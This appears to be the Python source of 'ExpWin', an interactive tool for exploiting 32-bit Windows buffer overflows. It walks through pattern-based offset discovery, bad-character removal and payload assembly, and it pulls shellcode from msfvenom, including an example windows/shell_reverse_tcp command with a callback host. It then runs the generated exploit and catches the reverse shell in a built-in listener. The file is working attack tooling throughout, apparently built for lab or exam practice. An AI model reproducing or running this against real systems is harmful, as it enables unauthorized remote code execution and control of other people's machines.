import subprocess, re, time, socket
import tempfile
import os
import reverse_shell
import threading 
#Next features: Upload the PE binary and the program will execute a binary recoginissment about the PE sections, vulnerable functions and protections
# Global variables
user_server = ""
port = ""
user_header = ""
user_data = ""
exploit = ""
payload = ""
pattern_length = 0
offset = 0
size_available_shellcode = 0
badchars = (
        b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
        b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
        b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
        b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
        b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
        b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
        b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
        b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
        b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
        b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
        b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
        b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
        b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
        b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
        b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
        b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
    )

banner = r"""
    ______         _       ___     
   / ____/  ______| |     / (_)___ 
  / __/ | |/_/ __ \ | /| / / / __ \
 / /____>  </ /_/ / |/ |/ / / / / /
/_____/_/|_/ .___/|__/|__/_/_/ /_/  v1.0
          /_/                      
   by Danilo Erazo @revers3vrything
               32 bits
"""

def get_initial_payload_structure():#Todo, add connectiviy test to the port, ip entered
    global user_server, user_header, user_data, port, exploit
    print(banner)

    user_server = input(">Enter the target server IP or hostname: ")
    #user_server = "192.168.110.10"
    port = int(input(">Enter the target port: "))
    #port = 80

    print("\n>Enter the HTTP request header structure (use 'data' as your payload variable and 'server' for the host):")
    print(">Enter header (end with a blank line):")

    header_lines = []
    while True:
        line = input()
        if line.strip() == "":
            break
        header_lines.append(line)
    user_header = "\n".join(header_lines)

    print("\n>Enter the data format using the variable padding (e.g., data = b\"username=\" + padding + b\"&password=A\"): ")
    user_data = input()
    exploit = f'''#!/usr/bin/python
import socket
import sys

server = "{user_server}"
port = {port}
payload = b"{payload}"
{user_data}

{user_header}
buffer = header + data
print("Sending evil buffer...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server, port))
s.send(buffer)
s.close()

print("Done!")
'''
def start_listener(port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", port))
    server.listen(1)
    print(f"[*] Listening on port {port}...\n")
    try:
        client_socket, addr = server.accept()
        print(f"[+] Connection received from {addr[0]}:{addr[1]}\n")

        # Interaction loop with reverse shell
        while True:
            command = input("expwin-shell> ")
            if command.strip() == "":
                continue
            client_socket.send(command.encode() + b"\n")

            # Receive ALL the response
            response = b""
            client_socket.settimeout(0.5)  # small timeout to detect end of response
            try:
                while True:
                    chunk = client_socket.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass  # Timeout is expected to end receiving

            print(response.decode(errors="ignore"))
            client_socket.settimeout(None)  # reset timeout
    except Exception as e:
        print(f"[!] Connection lost: {e}")
    finally:
        client_socket.close()
        server.close()

def print_exploit_raw(exploit_code):
    for line in exploit_code.splitlines():
        if line.strip().startswith("payload ="):
            # Extract the payload bytes
            payload_bytes = eval(line.split("=", 1)[1].strip())
            # Reconstruct it showing all bytes in hex
            hex_string = ''.join(f'\\x{b:02x}' for b in payload_bytes)
            print(f'payload = b"{hex_string}"')
        else:
            print(line)

def update_payload_in_exploit():#Update payload and run the program
    global exploit,payload
    lines = exploit.splitlines()
    updated_lines = []
    for line in lines:
        if line.strip().startswith("payload ="):
            updated_lines.append(f'payload = {payload}')
        else:
            updated_lines.append(line)
    exploit = "\n".join(updated_lines)
    print("\nGenerated exploit script:\n")
    print(exploit)
    #print_exploit_raw(exploit)

    with tempfile.NamedTemporaryFile("w", delete=False, suffix=".py") as f:
        f.write(exploit)
        temp_filename = f.name

    print(f"\n[*] Exploit saved to: {temp_filename}")
    todo = int(input("\n>> 1. Send the payload, 2. Exit: "))
    if todo == 1:
        listener = int(input(">> Do you want to set up a listener for reverse shell? 1. Yes, 2. No: "))
        if listener == 1:#Receive the reverse shell***************************************************
            port = int(input(">> Enter the port number: "))
            # Start the listener in a separate thread
            listener_thread = threading.Thread(target=start_listener, args=(port,))
            listener_thread.start()

            # Small delay to let the listener start properly (optional, depends on your case)
            time.sleep(2)
            print("[*] Executing exploit script...\n")
            os.system(f"python3 {temp_filename}")

            # Wait for listener to finish
            listener_thread.join()
        else:
            print("[*] Executing exploit script...\n")
            os.system(f"python3 {temp_filename}")
    else:
        print("")

def update_payload_bad_characters(bad_char):#Update payload but when only is the case of bad characters
    global payload,badchars
    # Convert string payload to actual bytes using eval
    try:
        # Convert string like "\\x0a" to actual byte
        bad_char_byte = bytes.fromhex(bad_char.replace('\\x', ''))
    except ValueError:
        print(f"[!] Invalid bad_char format: {bad_char}")
        return

    # Remove all occurrences of the bad character
    badchars = badchars.replace(bad_char_byte, b'')

    evaluated_payload = eval(payload, {"__builtins__": None}, {})
    # Now it's safe to concatenate
    payload_bytes = evaluated_payload + badchars
    # Optionally store it back as a bytes variable or string
    payload = payload_bytes


def discover_offset():
    global pattern_length, payload, offset
    #PART 1
    while True:
        pattern_length = int(input(">> Enter the pattern length: "))
        command = f"msf-pattern_create -l {pattern_length}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        pattern = result.stdout.strip()
        print("Pattern generated successfully:\n")
        print(pattern)

        #run crashing
        payload = pattern.encode() #PAYLOAD UPDATE 1****************************************************
        update_payload_in_exploit() 
        overflow = input("The payload cause a overflow? 1. Enter a key if not, 2. If yes, press Enter: ")
        if not overflow:
            os.system("clear")
            overwritten_value = input("\n>> Enter the value that overwrote the register: ")
            command = f"msf-pattern_offset -l {pattern_length} -q {overwritten_value}"
            offset_output = subprocess.run(command, shell=True, capture_output=True, text=True)

            offset_line = offset_output.stdout.strip().splitlines()[-1]
            offset = int(offset_line.split()[-1])

            print("\nOffset found at position:", offset)
            input(">> Press a key to continue: ")
            break
        
def generate_shellcode():
    print("Example of msfvenom command:")
    print('msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.200 LPORT=443 -f python -e x86/shikata_ga_nai -b "\\x00\\x0a\\x0d\\x25\\x26\\x2b\\x3d"')
    print()

    cmd = input("[+] Enter your full msfvenom command: ")
    # Run the command
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=20)
    # Search for the shellcode assignment (like buf = b"....")
    output = result.stdout.replace('\n', '')
    matches = re.findall(r'"(.*?)"', output)
    # Join all the parts together
    shellcode = ''.join(matches)

    print("\n[+] Shellcode extracted successfully!\n")
    buf = shellcode
    print(f"buf = b\"{buf}\"")
    return buf

def custom_exploit():
    global offset, payload
    print("Let's create the payload. e.g. (eip + offset + nops + shellcode)")
    offset = int(input("Enter the offset number: "))
    parts = [f'b"A" * {offset}']#the offset is a constant at the beginning
    while True:
        way = int(input(">> 1. To enter N characters,  2. To enter Hex/ESP/Gadget, 3. To enter Shellcode: "))
        if way == 1:#Enter N characters, e.g. b"C" * 4
            char = input(">> Enter the character e.g(A, \\x90): ").strip()
            length_expr = input(f">> Enter number of times for {char}: ").strip()
            length = eval(length_expr, {"__builtins__": None}, {})
            parts.append(f'b"{char}" * {length}')
        if way == 2:
            hex_ = input(">> Enter the hex e.g('\\x83\\x0c\\x09\\x10'): ").strip()
            parts.append(f'b"{hex_}"')
        if way == 3:
            opt = int(input(">> Select (1. Propietary shellcode, 2. Msvenom shellcode): "))
            if opt == 1:
                shellcode = reverse_shell.create_shellcode()
                parts.append(f'b"{shellcode}"')
            if opt == 2:#Msfvenom shellcode
                shellcode = generate_shellcode()
                parts.append(f'b"{shellcode}"')
        out = int(input(">> Enter more data: 1. Yes, 2. No: "))
        if out == 1:
            continue
        else:
            break
    payload = " + ".join(parts) #UPDATE PAYLOAD REST OF TIME*********************************************
    update_payload_in_exploit()
    print(payload)

def detect_bad_characters():
    global offset,badchars,payload
    c = 0
    print("Don't use the bad characters in: buffer, return address or shellcode.")
    print("Bad characters in C/C++ & HTTP packet:\n1. Return character/end of HTTP field: 0x0D\n2. Indicates the end of a string in C/C++: 0x00\n3. Translates to a line feed which terminates an HTTP field similar to a carriage return: 0x0A")
    print(f"The current offset is {offset}\n")
    prev_payload = payload
    while True:
        print("The current bad chars are: ")
        badchars_string = ''.join(f'\\x{b:02x}' for b in badchars)
        print(badchars_string)
        payload = prev_payload
        bad_char = input(">> Enter the bad character detected, (e.g. \\x0a): ")
        update_payload_bad_characters(bad_char)
        update_payload_in_exploit()
        char = input(">\n>> Enter a key to continue finding bad chars (or press Enter to finish): ").strip()
        if not char:
            break
    

# Start of the program
get_initial_payload_structure()

while True:
    os.system("clear")
    print(banner)
    print("\n--> Exploiting Buffer Overflows <--")
    print("1. Discover the offset through fuzzing")
    print("2. Send a custom exploit")
    print("3. Verify shellcode space")
    print("4. Detect bad characters (first step 2 to set offset)")
    print("5. Get opcodes")
    print("6. Exit")

    choice = input("Select an option: ")
    if choice == "1":
        discover_offset()
    if choice == "2":
        custom_exploit()
    if choice == "3":
        size_available_shellcode = int(input("Enter the available size for shellcode: "))
        if size_available_shellcode < 400:
            print("There is not available space for a shellcode (350 - 400) bytes: ")
        else:
            print("You have enough space for your shellcode!!")
        input("Press a key to continue: ")
    if choice == "4":
        custom_exploit()
        detect_bad_characters()
    if choice == "5":
        subprocess.run("msf-nasm_shell", shell=True)
    elif choice == "6":
        print("Exiting the ExpWin....")
        break
    else:
        print("Invalid option. Please try again.")
